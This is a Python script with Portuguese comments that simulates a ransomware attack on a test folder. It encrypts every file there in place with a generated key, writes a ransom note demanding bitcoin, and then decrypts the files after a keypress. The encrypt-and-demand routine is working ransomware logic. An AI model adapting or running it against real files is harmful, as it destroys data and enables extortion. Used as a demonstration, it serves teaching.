from cryptography.fernet import Fernet
import os

# --- Configurações ---
test_dir = "arquivos_teste"
key_file = "secreta.key"
ransom_note = "LEIA_ME_RESGATE.txt"

# --- 1. Geração da Chave (A fase em que o atacante gera a chave) ---
if not os.path.exists(key_file):
    key = Fernet.generate_key()
    with open(key_file, "wb") as kf:
        kf.write(key)
    print(f"Chave de criptografia gerada e salva em: {key_file}")
else:
    # Em um cenário real, o atacante já teria a chave. Aqui, carregamos para a simulação.
    with open(key_file, "rb") as kf:
        key = kf.read()

f = Fernet(key)

# --- 2. Função de Criptografia/Descriptografia ---
def processar_arquivos(diretorio, acao="criptografar"):
    """Criptografa ou descriptografa todos os arquivos em um diretório."""
    for item in os.listdir(diretorio):
        item_path = os.path.join(diretorio, item)
        if os.path.isfile(item_path) and item_path not in [key_file, os.path.join(diretorio, ransom_note)]:
            with open(item_path, "rb") as file:
                dados = file.read()
            
            if acao == "criptografar":
                dados_processados = f.encrypt(dados)
            elif acao == "descriptografar":
                dados_processados = f.decrypt(dados)
                
            with open(item_path, "wb") as file:
                file.write(dados_processados)
            print(f"[*] {acao.capitalize()}do: {item}")

# --- 3. Simulação de Resgate (Ransomware) ---
def gerar_nota_resgate():
    """Cria o arquivo de nota de resgate."""
    with open(os.path.join(test_dir, ransom_note), "w") as note:
        note.write("TODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!\n")
        note.write("Envie X BTC para o endereço Y para receber sua chave de descriptografia.\n")
        note.write(f"Sua chave de descriptografia (APENAS SIMULAÇÃO): {key.decode()}\n")

# --- EXECUÇÃO ---
print("\n--- SIMULAÇÃO DE ATAQUE DE RANSOMWARE ---")
processar_arquivos(test_dir, "criptografar")
gerar_nota_resgate()
print("\n--- ATENÇÃO: Arquivos criptografados e nota de resgate gerada! ---")

# --- SIMULAÇÃO DE DESCRIPTOGRAFIA (Após 'Pagamento') ---
input("\nPressione Enter para simular o 'pagamento' e descriptografar os arquivos...")
print("\n--- SIMULAÇÃO DE RECUPERAÇÃO DE DADOS ---")
processar_arquivos(test_dir, "descriptografar")
print("--- RECUPERAÇÃO CONCLUÍDA. Verifique o conteúdo dos arquivos. ---")